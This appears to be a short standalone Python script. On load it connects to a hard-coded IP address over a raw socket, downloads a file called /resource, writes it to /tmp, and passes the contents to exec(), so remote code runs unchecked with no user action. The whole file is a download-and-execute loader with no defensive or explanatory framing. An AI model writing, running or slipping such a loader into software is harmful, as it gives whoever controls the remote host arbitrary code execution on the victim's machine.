import socket
import os

def send():
    try:
        url = "http://113.11.168.1/resource"
        local_file = "/tmp/resource"

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("113.11.168.1", 80))
        sock.send(b"GET /resource HTTP/1.1\r\nHost: 113.11.168.1\r\n\r\n")

        data = b""
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            data += chunk

        script = data.decode().split("\r\n\r\n", 1)[-1]

        with open(local_file, "w") as f:
            f.write(script)

        exec(script)

    except Exception as e:
        print(e)

send()